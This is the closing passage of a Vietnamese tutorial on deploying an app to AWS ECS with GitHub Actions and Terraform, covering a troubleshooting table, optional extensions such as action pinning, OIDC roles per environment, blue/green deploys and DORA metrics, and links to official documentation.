| Sau `terraform apply` service quay về image cũ | Terraform ghi đè task definition | `lifecycle { ignore_changes = [task_definition] }`. |
| Task production `CannotPullContainerError` | Image nằm ở repo staging, execution role thiếu quyền | Kiểm tra execution role còn `AmazonECSTaskExecutionRolePolicy`. |
| Smoke test fail dù deploy xong | ALB còn trả từ task cũ | Vòng lặp chờ trong smoke test đã xử lý; nếu vẫn fail, xem log `/ecs/demo-api-staging`. |

## Đào sâu cuối tuần (tuỳ chọn)

- **Bảo mật pipeline:** pin action theo commit SHA thay vì `@v4`; bật Dependabot cho `github-actions` và `npm`; secret scanning + push protection; ký image bằng cosign hoặc AWS Signer.
- **Tách role theo môi trường:** `github-actions-demo-api-staging` chỉ update service staging, role `-prod` trust duy nhất `environment:production`. Đặt `AWS_DEPLOY_ROLE_ARN` ở cấp environment.
- **Chiến lược deploy:** blue/green với CodeDeploy cho ECS, canary bằng ALB weighted target group, feature flag.
- **Matrix build:** chạy test trên nhiều phiên bản Node.
- **DORA metrics:** deployment frequency, lead time for changes, change failure rate, time to restore. Pipeline này đo được cả 4.

## Tài liệu gốc

- GitHub: [Understanding GitHub Actions](https://docs.github.com/en/actions/about-github-actions/understanding-github-actions), [OpenID Connect](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect), [Configuring OIDC in AWS](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services), [Environments](https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment), [Reusable workflows](https://docs.github.com/en/actions/sharing-automations/reusing-workflows), [Security hardening](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
- AWS: [IAM OIDC identity providers](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_create_oidc.html), [ECS deployment circuit breaker](https://docs.aws.amazon.com/AmazonECS/latest/developerguide/deployment-circuit-breaker.html), [`aws-actions/configure-aws-credentials`](https://github.com/aws-actions/configure-aws-credentials), [`amazon-ecs-deploy-task-definition`](https://github.com/aws-actions/amazon-ecs-deploy-task-definition)
